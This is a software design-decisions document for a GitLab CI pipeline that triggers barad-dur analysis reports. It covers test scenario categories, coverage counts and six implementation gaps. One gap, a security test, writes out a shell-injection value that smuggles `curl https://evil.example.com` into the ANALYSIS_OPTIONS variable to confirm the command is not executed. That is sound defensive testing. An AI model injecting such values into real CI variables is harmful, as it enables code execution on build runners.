# DISTILL Decisions — gitlab-pipeline-api

## Upstream Issues

- **[UI-01]** DISCUSS acceptance-criteria.md (AC-01.4, AC-02.4) references `barad-dur-report.json` throughout. DESIGN wave architecture-design.md and component-boundaries.md changed the artifact to `barad-dur-report.html` (self-contained interactive HTML). All acceptance scenarios use HTML. The JSON reference in DISCUSS is superseded and DELIVER must not introduce a JSON artifact.

- **[UI-02]** Walking skeleton (US-01 + US-02) is already fully implemented in `.gitlab-ci.yml` (lines 596–661) and `ci/trigger-template.yml`. DELIVER scopes to gaps only — no TDD cycle needed for R1 behavior that already exists.

---

## Key Decisions

- **[D-01] Test framework**: Gherkin documentation-style scenarios only — no BDD runtime (pytest-bdd, Cucumber). This feature has no application entry point callable by a test framework. The driving ports are GitLab CI pipeline activation, file structure, and YAML inspection. Acceptance verification is: YAML/file inspection (automated with yq/grep) + live pipeline trigger on Froggit (manual smoke test or scheduled CI job).

- **[D-02] Three scenario categories**:
  - `@structural` — verifiable by file/YAML inspection without a live pipeline (grep, yq, yamllint)
  - `@implemented` — verifiable against already-running behavior on Froggit
  - `@skip` — scenarios covering gaps that DELIVER must implement before enabling

- **[D-03] Walking skeleton**: confirmed implemented as of commit d55d429 branch context. The analyze-api job and caller template both exist and are functional. The walking skeleton scenario in `walking-skeleton.feature` is tagged `@implemented`.

- **[D-04] Artifact naming in scenarios**: All scenarios use `barad-dur-report.html` to match the DESIGN wave decision. The DISCUSS wave referenced JSON; any tooling or documentation referencing JSON is a defect to be corrected in DELIVER.

- **[D-05] Driving port identification**: Tests invoke through these entry points only — never internal job script sub-components:
  - GitLab Trigger API `POST /api/v4/projects/:id/trigger/pipeline` (US-01, US-02, US-03, US-06, US-07)
  - `analyze-api` job in `.gitlab-ci.yml` (US-01, US-03, US-06, US-07, US-08)
  - `.barad-dur-analysis` hidden job in `ci/trigger-template.yml` (US-02, US-04, US-08, US-09)
  - `docs/pipeline-api-setup.md` file existence and section content (US-05, US-08, US-09)

---

## Test Coverage Summary

| Metric | Count |
|--------|-------|
| Total scenarios | 44 |
| `@implemented` | 38 |
| `@structural` | 22 |
| `@skip` (gaps for DELIVER) | 6 |
| `@walking_skeleton` | 1 |
| `@security` | 1 |
| R1 complete | yes |
| R2 gaps | ANALYSIS_OPTIONS pass-through (US-03, AC-03.1, AC-03.2) |
| R3 gaps | Timeout doc threshold (AC-08.4), concurrency trade-off doc (AC-09.1), staggering guidance (AC-09.4) |

Error path ratio: 14 error/edge scenarios out of 35 focused scenarios = **40%** (meets >= 40% target).

Files produced:
- `walking-skeleton.feature` — 12 scenarios (R1, US-01 + US-02)
- `milestone-2-enhanced-api.feature` — 24 scenarios (R2, US-03 through US-07)
- `milestone-3-robustness.feature` — 8 scenarios (R3, US-08 + US-09)
- `walking-skeleton.md` — implementation status confirmation with file/line references
- `test-scenarios.md` — story-by-story coverage map with gap analysis

---

## DELIVER Scope (handoff)

Gaps for DELIVER wave to implement, in priority order:

### Gap 1: ANALYSIS_OPTIONS variable pass-through (US-03, AC-03.1)

**File**: `.gitlab-ci.yml`, line 643
**Current**: `barad-dur analyze /tmp/target --html -o barad-dur-report.html ${CATEGORY_FLAGS}`
**Required**: `barad-dur analyze /tmp/target --html -o barad-dur-report.html ${CATEGORY_FLAGS} ${ANALYSIS_OPTIONS:-}`
**Scenarios enabled on completion**: S-03.1 (`@skip` in milestone-2-enhanced-api.feature, "Analysis options are forwarded...")

### Gap 2: ANALYSIS_OPTIONS forwarding in caller template (US-03, AC-03.1)

**File**: `ci/trigger-template.yml`, lines 49–76 (trigger body construction)
**Required**: Add `if [ -n "${ANALYSIS_OPTIONS:-}" ]; then TRIGGER_BODY="${TRIGGER_BODY}&variables[ANALYSIS_OPTIONS]=${ANALYSIS_OPTIONS}"; fi` after line 61
**Depends on**: Gap 1
**Scenarios enabled on completion**: S-03.1 variant in milestone-2 ("Caller template forwards ANALYSIS_OPTIONS...")

### Gap 3: Shell injection prevention for ANALYSIS_OPTIONS (US-03, AC-03.2)

**File**: `.gitlab-ci.yml`, analyze-api job script
**Required**: ANALYSIS_OPTIONS must be passed to barad-dur as a shell-quoted argument (not via eval). Verify by attempting `ANALYSIS_OPTIONS="; curl evil.example.com; echo "` and confirming the embedded command does not execute.
**Scenarios enabled on completion**: S-03.2 (`@skip @security` in milestone-2-enhanced-api.feature)
**Concrete attack vector from scenario**: `ANALYSIS_OPTIONS` set to `; curl https://evil.example.com; echo `

### Gap 4: skip-blame threshold in setup guide (US-08, AC-08.4)

**File**: `docs/pipeline-api-setup.md`, Performance Tips section (around line 123)
**Required**: Add "For repositories with more than 50,000 commits, we recommend using `--skip-blame` via ANALYSIS_OPTIONS (once implemented) to reduce analysis time significantly."
**Scenarios enabled on completion**: "Setup guide recommends skip-blame for repositories with more than 50,000 commits" in milestone-3-robustness.feature

### Gap 5: Concurrency trade-off explanation in docs (US-09, AC-09.1)

**File**: `docs/pipeline-api-setup.md`, Concurrency section (around line 139)
**Required**: Add paragraph explaining parallel (default, faster total throughput, higher concurrent runner load) vs resource_group (sequential, lower peak runner load, higher wall-clock time for callers). Guidance: use parallel unless runner queue depth exceeds capacity.
**Scenarios enabled on completion**: "Documentation explains the trade-off between parallel and sequential execution" in milestone-3-robustness.feature

### Gap 6: Staggering guidance for >10 concurrent triggers (US-09, AC-09.4)

**File**: `docs/pipeline-api-setup.md`, Concurrency section
**Required**: Add "For company-wide rollouts with more than 10 teams triggering simultaneously, consider offsetting cron schedules (e.g., stagger by 5–10 minutes per team) to distribute runner load without requiring resource_group."
**Scenarios enabled on completion**: "Documentation recommends staggering pipeline schedules..." in milestone-3-robustness.feature

---

## Mandate Compliance Evidence

**CM-A (Driving port enforcement)**: All scenarios invoke through GitLab Trigger API, analyze-api job, ci/trigger-template.yml hidden job, or docs file structure. No scenario invokes an internal script sub-step or barad-dur Rust function directly.

**CM-B (Business language purity)**: Gherkin uses "health report", "analysis completes", "report artifact", "quality gate", "repository URL" — not "HTTP 201", "exit code", "curl POST", "jq parse", "grep". Technical terms appear only in code comments explaining driving ports and implementation notes, never in Scenario Given/When/Then steps.

**CM-C (Walking skeleton user-centricity)**: The `@walking_skeleton` scenario title is "DevOps engineer triggers analysis and receives an HTML health report" — describes user goal, not technical layers. Then steps describe what Fatima's pipeline receives (a downloadable report), not internal state (artifact row in database). Non-technical stakeholder confirmation test: "Can Fatima trigger analysis and receive a report?" — Yes, demonstrable today.
